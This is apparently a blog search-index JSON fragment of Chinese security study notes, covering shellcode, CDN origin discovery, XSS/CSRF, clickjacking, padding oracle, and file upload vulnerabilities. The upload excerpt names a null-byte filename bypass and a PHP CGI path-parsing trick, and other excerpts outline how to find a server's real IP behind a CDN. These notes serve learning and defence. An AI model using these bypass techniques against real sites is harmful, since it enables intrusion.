安装KLEE，完成官方tutorials（前三个）","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"ShellCode实验","date":"2020-06-28T22:22:15.000Z","path":"posts/2a55224b/","slug":"ShellCode实验","permalink":"https://hejueyun.github.io/posts/2a55224b/","excerpt":"1. 实验要求 阅读 www.exploit-db.com 中的shellcode。建议找不同功能的，不同平台的 shellcode解读 修改示例代码的shellcode，将其功能改为下载执行。也就是从网络中下载一个程序，然后运行下载的这个程序 2. 实验原理2.1. shellcode a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called “shellcode” because it typically starts a command shell from which the attacker can control the compromised machine 2.2. 内核态 shellcode按照放置的位置可以分为三种：用户态shellcode和内核态shellcode或者二者混合。 shellcode的选择要依赖于漏洞类型和使用的内存模型，内核态shellcode的利用限制有很多，首先shellcode必须在内核利用当前页表可以直接访问的虚拟地址空间范围内，也就是说得把shellcode放到了实现用户态&#x2F;内核态分离地址空间模型的系统位以内核上下文中，并且放到混合空间模型的系统的内核上下文和返回上下文中。除此之外，放置shellcode的内存必须是可以执行区域（DEP存在一个数据区不可执行的安全策略），也就是说存放shellcode的页需要将执行标志位打开，如果shellcode在用户态的话就会相对简单些。第三点，储存shellcode的区域必须要在内存中，也就是说内核可能会隐含地将要执行的内存作为分页，所以不能承受再从硬盘中取shellcode页(core dump?) 2.3. xor代替mov 0 这串shellcode中还有一些NULL（\\x00）字符，当我们把shellcode复制到缓冲区时，有时候会出现异常（因为字符数组用null做终止符）。要编写真正有用的shellcode我们还要想办法把\\x00消去。 首先我们看第一条指令（mov ebx, 0）将0放入ebx中。熟悉汇编的话就会知道，xor指令在操作数相等的情况下返回0，也就是可以在指令里不使用0，但是结果返回0，那么我们就可以用xor来代替mov指令了 2.4. ps","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"虚内存","date":"2020-06-25T17:00:42.000Z","path":"posts/f46cf366/","slug":"虚内存","permalink":"https://hejueyun.github.io/posts/f46cf366/","excerpt":"1. 实验要求 阅读VirtualAlloc、VirtualFree、VirtualProtect等函数的官方文档 编程使用malloc分配一段内存，测试是否这段内存所在的整个4KB都可以写入读取 分配一段可读可写的虚内存，写入内存，然后将这段内存改为只读，再读数据和写数据，看是否会有异常情况。然后再释放这段内存，再测试对这段内存的读写释放正常 验证不同进程的相同的地址可以保存不同的数据 2. 实验原理2.1. VirtualAlloc function 在调用进程的虚拟地址空间中保留，占用或更改页面区域的状态。该函数分配的内存将自动初始化为零。 首先，必须知道保留(Reserved)内存和占用（Committed）内存的含义。当内存放保留时，一段连续虚拟地址空间被留出。例如，假如我们的程序要使用5 -MB内存块（称为区域），但并不是要马上全部使用，则我们可以调用VirtualAlloc函数，使用MEM_RESERVE分配类型参数。Windows会以64 KB为边界计算该区域的起始地址，并防止进程在同一个范围内为其他内存保留。我们可以指定区域的起始地址，但更常见的是让Windows为区域分配地址。此时除了地址分配外，其他什么也没发生。没有RAM被分配，也没有交换文件空间被保留出来。当我们对内存的需求更迫切时，我们可以再次调用函数VirtualAlloc来占用被保留的内存，调用时使用MEM_COMMIT分配类型参数。现在，区域的起始和结束地址都被计算到4KB边界，对应的交换文件页和所要求的页表被留出来。内存块可以被指定为只读或者可读写。然而，仍然没有RAM被分配；只有当程序访问这部分内存时RAM内存才会被真正分配。如果在此之前内存没有被保留，那就不会有问题；如果在此之前内存被占用了的话，也不会有问题。所以原则是，在使用内存之前一定要先占用。我们可以调用VirtualFree函数“收回”(decommit)占用的内存，使指定的页回到保留的状态。VirtualFree也能够释放保留的内存区域，但我们必须指定其基地址，这个基地址是在前面调用VirtualAlloc保留内存时获得的。 123456LPVOID VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); 2.2. 区别2.2.1. VirtualAlloc A low-level, Windows API that provides lots of options, but is mainly useful for people in fairly specific situations. Can only allocate memory in larger chunks One of the most common is if you have to share memory directly with another proces 2.2.2. HeapAlloc","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"信安小知识-3","date":"2020-06-22T21:46:58.000Z","path":"posts/7f7b91c5/","slug":"信安小知识-3","permalink":"https://hejueyun.github.io/posts/7f7b91c5/","excerpt":"1. CDN绕过 子域名查询 因为使用CDN是需要费用的，所以一般公司可能不会让所有的子域名都使用CDN，一般访问量较少的可能没有使用CDN。那么那个子域名的ip就有可能是目标站点的真实IP了 国外地址请求 邮件服务查询 通过各种方式，让对方给你发送邮件。注册验证码、社工、等等 以qq邮箱为例：只需要点查看邮件原文，关注Received即可 dns历史记录 ssrf 2. CDN流量放大攻击2.1. 背景 CDN的全称是Content Delivery Network（内容分发网络），通过在网络各处的加速节点服务器来为网站抵挡恶意流量，把正常流量进行转发 12345671. 跨运营商加速：我们自己的网站常常只属于一个运营商(比如：电信)，而加速节点遍布每家运营商，于是和网站不同运营商（比如：联通）的用户访问起来就不会那么慢了。2. 缓存加速：很多的静态资源以及一部分页面更新都是比较慢的（比如首页），这个时候CDN就会根据浏览器的max-age和last-modified值以及管理员的预设值来进行缓存，于是很多流量CDN节点就不会每次都来向网站请求，CDN节点可以直接自作主张地将命中的缓存内容返回。 3. 恶意流量过滤：这是CDN非常重要的一个作用，也是很多网站会用CDN的原因，因为CDN能为我们抵挡攻击大流量攻击、普通的攻击（比如注入等），只有正常流量才会转发给网站。源站：我们自己的那个网站就被称为是源站。 反向代理：CDN节点向源站请求数据的方式就叫反向代理，也就是上文所说的转发。 回源：CDN节点向源站请求数据的行为就叫做回源。 2.2. 防御12341. 禁止把源站IP设为CDN节点本身（这是必须的）。2. 限制每个站点的带宽。 3. 对请求超时的源站做一定限制。 4. 通过X-Forwarded-For来进行限制，超过多少层自动丢弃。 3. 后端程序获取客户端IP设置转发请求头","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"linux小知识-1","date":"2020-06-22T21:36:47.000Z","path":"posts/a593fcba/","slug":"linux小知识-1","permalink":"https://hejueyun.github.io/posts/a593fcba/","excerpt":"1. utmp&#x2F;wtmp utmp 文件的绝对路径是 &#x2F;var&#x2F;run&#x2F;utmp ，该文件通常用 who 命令来读取； utmp日志文件记录有关当前登录的每个用户的信息。因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会为用户保留永久的记录。系统中需要查询当前用户状态的程序，如 who、w、users、finger等就需要访问这个文件。 wtmp 文件的绝对路径是 &#x2F;var&#x2F;log&#x2F;wtmp ，该文件通常通过 last 命令来读取。 wtmp日志文件永久记录每个用户登录、注销及系统的启动、停机的事件。因此随着系统正常运行时间的增加，该文件的大小也会越来越大，增加的速度取决于系统用户登录的次数。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录记录，last也能根据用户、终端tty或时间显示相应的记录 这两个文件都不是普通的文本文件，所以不能用 cat ，less，more 等命令来查看 last命令用了显示用户登录情况，以下是直接显示固定行数的记录： 1234567891011last -10root pts/0 221.6.45.34 Tue Dec 17 09:40 still logged inroot pts/0 221.6.45.34 Mon Dec 16 09:00 - 11:57 (02:56)root pts/0 222.94.97.122 Sun Dec 15 20:39 - 23:28 (02:48)root pts/0 222.95.209.80 Sat Dec 14 14:39 - 14:58 (00:18)root pts/0 221.6.45.34 Thu Dec 12 16:55 - 17:37 (00:41)root pts/0 49.65.139.195 Wed Dec 11 20:40 - 21:16 (00:35)root pts/0 49.65.139.195 Wed Dec 11 19:46 - 20:03 (00:17)root pts/0 221.6.45.34 Tue Dec 10 14:41 - 15:52 (01:10)root pts/0 221.6.45.34 Mon Dec 9 17:24 - 17:30 (00:06)root pts/0 221.6.45.34 Mon Dec 9 09:38 - 11:41 (02:02) 2. 文件目录data当前权限为rwx — —，只需要增加用户组可读权限，但不允许写操作，具体方法为： chmod+050data 别忘了，文件夹首先要可访问才行，因此不论干什么必须加上x权限 3. 与用户管理相关的配置文件1234561. /etc/passwd 用来存储操作系统用户信息（eg：bin:x:1:1:bin:/bin:/sbin/nologin ）12 2. /etc/shadow shadow 是 passwd 的影子文件。(为了安全，现在的linux都提供了 /etc/shadow这个影子文件，密码放在这个文件里面，并且是只有root可读的。 ) 3. /etc/group 存储有关本地用户组的信息 4. 程序员小李通过管道统计prog.c函数中for语句通过的次数，需要使用的指令分别是 grep “for” proc.c | wc -l 5. 下面对linux下mysqldump备份命令及参数描述正确的是 mysqldump -h ip -uroot -p DBNAME &gt;bck.sql","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Notes","slug":"Operating-System/Linux/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Notes/"}],"tags":[]},{"title":"信安小知识-2","date":"2020-06-21T07:40:22.000Z","path":"posts/87ca153/","slug":"信安小知识-2","permalink":"https://hejueyun.github.io/posts/87ca153/","excerpt":"1. 摆渡木马？ 摆渡木马是一种特殊的木马，其感染机制与 U 盘病毒的传播机制完全一样，只是感染目标计算机后，它会尽量隐蔽自己的踪迹，不会出现普通 U 盘病毒感染后的症状，如更改盘符图标、破坏系统数据、在弹出菜单中添加选项等，它唯一的动作就是扫描系统中的文件数据，利用关键字匹配等手段将敏感文件悄悄写回 U 盘中，一旦这个 U 盘再插入到连接互联网的计算机上，就会将这些敏感文件自动发送到互联网上指定的计算机中。摆渡木马是一种间谍人员定制的木马，隐蔽性、针对性很强，一般只感染特定的计算机，普通杀毒软件和木马查杀工具难以及时发现。 2. 网络木马? 网络木马通常采用记录用户键盘输入、Hook游戏进程API函数等方法获取用户的密码和帐号。窃取的信息一般通过发送电子邮件或向远程脚本程序提交的方式发送给木马作者 3. XSS vs CSRF ? .XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害(?存储xss？)，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本 CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分类 4. Vulnerability scan 缺陷&#x2F;弱点扫描，Attacker可以扫描目标的漏洞，进行相应攻击 5. Drive-by downloading Attacker可以给目标公司员工群发一份邮件，如果不小心点击其中的附件，可能就会运行了恶意程序","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"Python反序列化漏洞","date":"2020-06-19T19:53:48.000Z","path":"posts/a0ad0427/","slug":"Python反序列化漏洞","permalink":"https://hejueyun.github.io/posts/a0ad0427/","excerpt":"1. 序列化(Serialization)和反序列化(也称为解编组、deserialization、unmarshalling) 序列化与反序列化是开发过程中不可或缺的一步，简单来说，序列化是将对象转换成字节流的过程，是将对象状态转换为可保持或可传输的格式的过程，而反序列化的是将字节流恢复成对象的过程","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"}],"tags":[]},{"title":"网络小知识-1","date":"2020-06-19T11:55:34.000Z","path":"posts/55156457/","slug":"网络小知识-1","permalink":"https://hejueyun.github.io/posts/55156457/","excerpt":"1. ssl&#x2F;tlsTLS 1.0 IETF将SSL标准化，即 RFC 2246 ，并将其称为TLS（Transport Layer Security）。 SSL协议主要分为两层： SSL记录协议层的作用是为高层协议提供基本的安全服务。SSL记录协议针对HTTP协议进行了特别的设计，使得超文本的传输协议HTTP能够在SSL运行。纪录封装各种高层协议，具体实施压缩解压缩、加密解密、计算和校验MAC等与安全有关的操作。 SSL握手协议层包括SSL握手协议（SSL HandShake Protocol）、SSL密码参数修改协议（SSL ChangeCipher Spec Protocol）和SSL告警协议（SSL AlertProtocol）。握手层的这些协议用于SSL管理信息的交换，允许应用协议传送数据之间相互验证，协商加密算法和生成密钥等。 SSL的建立过程总共有13个包，第一次建立至少需要9个包。 Handshake phase（握手阶段）： 协商加密算法 认证服务器 建立用于加密和MAC（Message Authentication Code）用的密钥 2. session和cookie的区别 由于HTTP协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是Session.典型的场景比如购物车，当你点击下单按钮时，由于HTTP协议无状态，所以并不知道是哪个用户操作的，所以服务端要为特定的用户创建了特定的Session，用用于标识这个用户，并且跟踪用户，这样才知道购物车里面有几本书。 每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是用 Cookie 来实现Session跟踪的，第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在 Cookie 里面记录一个Session ID，以后每次请求把这个会话ID发送到服务器，我就知道你是谁了 session 在服务器端，cookie 在客户端（浏览器） session 的运行依赖 session id，而 session id 是存在 cookie 中的，也就是说，如果浏览器禁用了 cookie ，同时 session 也会失效（但是可以通过其它方式实现，比如在 url 中传递 session_id） session 默认被存在在服务器的一个文件里（不是内存） session 可以放在 文件、数据库、或内存中都可以。 3. 断点续传","categories":[{"name":"Computer Network","slug":"Computer-Network","permalink":"https://hejueyun.github.io/categories/Computer-Network/"},{"name":"Notes","slug":"Computer-Network/Notes","permalink":"https://hejueyun.github.io/categories/Computer-Network/Notes/"}],"tags":[]},{"title":"点击劫持","date":"2020-06-18T14:41:20.000Z","path":"posts/96c8277d/","slug":"点击劫持","permalink":"https://hejueyun.github.io/posts/96c8277d/","excerpt":"1. 简介 Clickjacking, also known as a “UI redress attack”, is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the top level page. Thus, the attacker is “hijacking” clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both. Using a similar technique, keystrokes can also be hijacked. With a carefully crafted combination of stylesheets, iframes, and text boxes, a user can be led to believe they are typing in the password to their email or bank account, but are instead typing into an invisible frame controlled by the attacker. 点击劫持（ClickJacking）是一种视觉上的欺骗手段。大概有两种方式，一是攻击者使用一个透明的iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的iframe页面；二是攻击者使用一张图片覆盖在网页，遮挡网页原有位置的含义 2. iframe覆盖 使用一个HTTP头——X-Frame-Options。X-Frame-Options可以说是为了解决ClickJacking而生的，它有三个可选的值： 12345DENY：浏览器会拒绝当前页面加载任何frame页面；SAMEORIGIN：frame页面的地址只能为同源域名下的页面；ALLOW-FROM origin：允许frame加载的页面地址； Apache配置:Header always append X-Frame-Options SAMEORIGIN nginx配置:add_header X-Frame-Options SAMEORIGIN; 3. 图片覆盖图片覆盖攻击（Cross Site Image Overlaying），攻击者使用一张或多张图片，利用图片的style或者能够控制的CSS，将图片覆盖在网页上，形成点击劫持。当然图片本身所带的信息可能就带有欺骗的含义，这样不需要用户点击，也能达到欺骗的目的 在可以输入HTML内容的地方加上一张图片，只不过将图片覆盖在指定的位置 4. 参考","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"}],"tags":[]},{"title":"信安小知识-1","date":"2020-06-17T22:12:03.000Z","path":"posts/9175f0e9/","slug":"信安小知识-1","permalink":"https://hejueyun.github.io/posts/9175f0e9/","excerpt":"1. 如何获取一个IP地址曾经属于哪些域名IP History - ViewDNS.info 2. 怎样逆向一个数据结构？待补 3. 怎样判断一个网站是否为钓鱼网站？ 基于页面文本特征的钓鱼识别技术 由于钓鱼网站自身特有的明显特征，可以通过基于页面文本特征的钓鱼识别技术来检测钓鱼网站。首先提取页面的钓鱼特征，如文字特征和DOM（Document Object Model）结构特征，通过分析与正常官网的特征区别进行对比识别。可以通过以下几个方面提取特征：WEB页面URL，链接对象，表单，资源等等。 基于域名whois的钓鱼识别技术 任何一个域名在注册的时候都需要在域名注册商那里填写域名注册人的相关信息。那么识别钓鱼网站的时候也可以通过域名whois进行钓鱼识别(有网站提供whois域名查找) 基于网站备案识别 基于黑名单的钓鱼识别技术，基于网站黑名单存放的数据库进行识别。 基于PR(PageRank)网页级别进行判断 PR值全称为PageRank(网页级别），钓鱼网站由于流动性和临时性，网站的PR值很低，一般的钓鱼网站PR值为0.而钓鱼网站所仿的官方真实网站PR值一般很高。 4. 移动安全包含了什么内容？1）移动APP漏洞审计挖掘2）移动应用逆向、加固、破解3）平台攻防、平台漏洞挖掘、平台加固方案（例如ARM TrustZone）4）反病毒木马（检测以及杀毒） 5. 信息安全是什么？ 信息安全，意为保护信息及信息系统免受未经授权的进入、使用、披露、破坏、修改、检视、记录及销毁。","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"安全开发流程","date":"2020-06-17T11:24:46.000Z","path":"posts/c254ee28/","slug":"安全开发流程","permalink":"https://hejueyun.github.io/posts/c254ee28/","excerpt":"","categories":[],"tags":[]},{"title":"Webserver配置安全","date":"2020-06-17T11:17:31.000Z","path":"posts/6a1d409c/","slug":"Webserver配置安全","permalink":"https://hejueyun.github.io/posts/6a1d409c/","excerpt":"","categories":[],"tags":[]},{"title":"应用层拒绝服务攻击","date":"2020-06-17T11:17:13.000Z","path":"posts/f156eac7/","slug":"应用层拒绝服务攻击","permalink":"https://hejueyun.github.io/posts/f156eac7/","excerpt":"","categories":[],"tags":[]},{"title":"加密算法与随机数","date":"2020-06-17T11:16:36.000Z","path":"posts/ac9dc7a3/","slug":"加密算法与随机数","permalink":"https://hejueyun.github.io/posts/ac9dc7a3/","excerpt":"1. ECB模式的缺陷(电码簿模式) ECB模式最大的问题也是出在这种分组的独立性上:攻击者只需要对调任意分组的密文，在经过解密后，所得明文的顺序也是经过对调的 这正好是一个或两个分组的长度，因此攻击者只需要使用“1.00”的密文，替换“10000.00 “的密文，即可伪造支付金额从10000元至1元。在实际攻击中，攻击者可以通过事先购买一个1元物品，来获取1.00的密文，这并非一件很困难的事情。 2. 针对CBC(链式加密模式)模式的“Padding Oracle Attack “（填充提示攻击） 所以Padding Oracle实际上是一种边信道攻击，攻击者只需要知道密文的解密结果是否正确即可，而这往往有许多途径 比如在Web应用中，如果是padding不正确，则应用程序很可能会返回500的错误;如果padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误 2.1. 边信道攻击 边信道攻击(side channel attack 简称SCA)，又称侧信道攻击:针对加密电子设备在运行过程中的时间消耗、功率消耗或电磁辐射之类的侧信道信息泄露而对加密设备进行攻击的方法被称为边信道攻击。这类新型攻击的有效性远高于密码分析的数学方法，因此给密码设备带来了严重的威胁 adding Oracle Attack的关键在于攻击者能够获知解密的结果是否符合padding。在实现和使用CBC模式的分组加密算法时，注意这一点即可。","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"访问控制","date":"2020-06-17T11:16:05.000Z","path":"posts/2df81189/","slug":"访问控制","permalink":"https://hejueyun.github.io/posts/2df81189/","excerpt":"1. 概述 抽象地说，都是某个主体对某个客体需要实施某种操作，而系统对这种操作的限制就是权限控制 在操作系统中，对文件的访问也有访问控制。此时“主体”是系统的用户，“客体”是被访问的文件，能否访问成功，将由操作系统给文件设置的ACL(访问控制列表)决定。比如在Linux系统中，一个文件可以执行的操作分为“读”、“写”、“执行”三种，分别由r w x表示。这三种操作同时对应着三种主体:文件拥有者、文件拥有者所在的用户组、其他用户 1.1. 管理后台 在正常情况下，管理后台的页面应该只有管理员才能够访问。但这些系统未对用户访问权限进行控制，导致任意用户只要构造出了正确的URL，就能够访问到这些页面。但是把需要保护的页面“藏”起来，并不是解决问愚的办法。 2. 垂直权限管理 访问控制实际上是建立用户与权限之间的对应关系，现在应用广泛的一种方法，就是“**基于角色的访问控制(Role-Based Access Control)**”，简称RBAC 2.1. Spring Security Spring Security中的权限管理，就是RBAC模型的一个实现。Spring Security基于MVC框架，它的前身是Acegi，是一套较为全面的Web安全解决方案。在Spring Security中提供了认证、授权等功能 Spring Security提供两种权限管理方式 一种是“基于URL的访问控制” 一种是“基于method的访问控制”。这两种访问控制都是RBAC模型的实现，换言之，在Spring Security中都是验证该用户所属的角色，以决定是否授权 3. 水平权限管理3.1. 区别","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"}],"tags":[]},{"title":"认证与会话管理","date":"2020-06-17T11:15:54.000Z","path":"posts/6db9a849/","slug":"认证与会话管理","permalink":"https://hejueyun.github.io/posts/6db9a849/","excerpt":"认证的英文是Authentication，授权则是Authorization 1. 密码强度 2011年12月，国内最大的开发者社区CSDN的数据库被黑客公布在网上。令人震惊的是，CSDN将用户的密码明文保存在数据库中，致使600万用户的密码被泄露。明文保存密码的后果很严重，黑客们曾经利用这些用户名与密码，尝试登录了包括QQ、人人网、新浪微博、支付宝等在内的很多大型网站，致使数以万计的用户处于风险中。 彩虹表(Rainbow Table ) 虹表的思路是收集尽可能多的密码明文和明文对应的MD5值。这样只需要查询MD5值，就能找到该MD5值对应的明文。一个好的彩虹表，可能会非常庞大，但这种方法确实有效。彩虹表的建立，还可以周期性地计算一些数据的MD5值，以扩充彩虹表的内容 2. 多因素认证 除了支付密码外，手机动态口令、数字证书、宝令、支付盾、第三方证书等都可用于用户认证。这些不同的认证手段可以互相结合，使得认证的过程更加安全。密码不再是唯一的认证手段，在用户密码丢失的情况下，也有可能有效地保护用户账户的安全。 3. Session与认证 密码与证书等认证手段，一般仅仅用于登录(Login)的过程。当登录完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证成功后，就需要替换一个对用户透明的凭证。这个凭证，就是SessionID 此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。最常见的做法就是把SessionID加密后保存在Cookie中，因为Cookie会随着HTTP请求头发送，且受到浏览器同源策略的保护 SessionID一旦在生命周期内被窃取，就等同于账户失窃 4. Session Fixation攻击(固定攻击)","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[]},{"title":"文件上传漏洞","date":"2020-06-17T11:13:01.000Z","path":"posts/931c692/","slug":"文件上传漏洞","permalink":"https://hejueyun.github.io/posts/931c692/","excerpt":"1. 概述 上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行; 上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似): 上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行; 上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。 首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径。 其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也不能称之为漏洞。 最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。 2. 攻击2.1. 绕过文件上传检查功能 比如应用原本只允许上传JPG图片，那么可以构造文件名(需要修改POST包)为xxx.php[\\0].JPG，其中[\\0]为十六进制的0x00字符，.JPG绕过了应用的上传文件类型判断;但对于服务器端来说，此文件因为0x00字符截断的关系，最终却会变成xxx.php。 但服务器未调用php解释器，也无法成功 在正常情况下，通过判断前10个字节，基本上就能判断出一个文件的真实类型。 常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后， 2.2. PHP CGI路径解析问题url/path/test.jpg/notexist.php 会将test.jpg当做PHP进行解析。Notexist.php是不存在的文件 PHP的配置文件中有一个关键的选项:cgi.fix_pathinfo，这个选项默认是开启的 在映射URI时，两个环境变量很重要:一个是PATH_INFO，一个是SCRIPT_FILENAME notexist.php不存在，所以将往前递归查询路径 2.3. 利用上传文件钓鱼 服务器端的应用，还需要为客户端买单 而利用文件上传功能，钓鱼者可以先将包含了标网站，然后通过传播这个文件的URL进行钓鱼，HTML的文件(比如一张图片)上传到目则URL中不会出现钓鱼地址，更具有欺骗性。 在正常情况下，浏览器是不会将JPg文件当做HTML执行的，但是在低版本的IE中，比如IE 6和IE 7，包括IE 8的兼容模式，浏览器都会“自作聪明”地将此文件当做HTML执行。这个问题在很早以前就被用来制作网页木马，但微软一直认为这是浏览器的特性，直到IE 8中有了增强的MIME Sniff，才有所缓解。","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[]},{"title":"html5安全","date":"2020-06-17T11:12:47.000Z","path":"posts/861ebd69/","slug":"html5安全","permalink":"https://hejueyun.github.io/posts/861ebd69/","excerpt":"《白帽子讲Web安全》笔记 1. 简介 HTML5是HTML最新的修订版本，由万维网联盟（W3C）于2014年10月完成标准制定 2. iframe的sandbox 在HTML5中，专门为iframe定义了一个新的属性，叫sandbox。使用sandbox这一个属性后，&lt;iframe&gt;标签加载的内容将被视为一个独立的“源”(源的概念请参考“同源策略”)，其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其他浏览对象的链接也会被禁止。 2.1. iframe An iFrame is a frame within a frame. It is a component of an HTML element that allows you to embed documents, videos, and interactive media within a page. By doing this, you can display a secondary webpage on your main page iFrame is an additional element to share content from other sites. &lt;iframe src=&quot;https://www.youtube.com/embed/dXBohfjc4WA&quot; width=&quot;680&quot; height=&quot;480&quot; allowfullscreen&gt;&lt;/iframe&gt; 3. Link Types: noreferrer 在HTML5中为&lt;a&gt;标签和&lt;area&gt;标签定义了一个新的Link Types:no referrer顾名思义，标签指定了noreferrer后，浏览器在请求该标签指定的地址时将不再发送 &lt;a href=&quot;xxx&quot; rel=&quot;noreffer&quot;&gt;test&lt;/a&gt;这种设计是出于保护敏感信息和隐私的考虑。因为通过Referer，可能会泄露一些敏感信息","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[]},{"title":"跨站点请求伪造","date":"2020-06-17T11:12:12.000Z","path":"posts/f6e33bc4/","slug":"跨站点请求伪造","permalink":"https://hejueyun.github.io/posts/f6e33bc4/","excerpt":"《白帽子讲Web安全》笔记 1. 简介 CSRF的全名是Cross Site Request Forgery，翻译成中文就是跨站点请求伪造。","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[]},{"title":"浏览器安全","date":"2020-06-17T11:11:55.000Z","path":"posts/adb435e3/","slug":"浏览器安全","permalink":"https://hejueyun.github.io/posts/adb435e3/","excerpt":"《白帽子讲Web安全》笔记 1. 同源政策 同源的定义 如果两个 URL 的 protocol、port (如果有指定的话)和 host 都相同的话，则这两个 URL 是同源。这个方案也被称为“协议&#x2F;主机&#x2F;端口元组”，或者直接是 “元组”。（“元组” 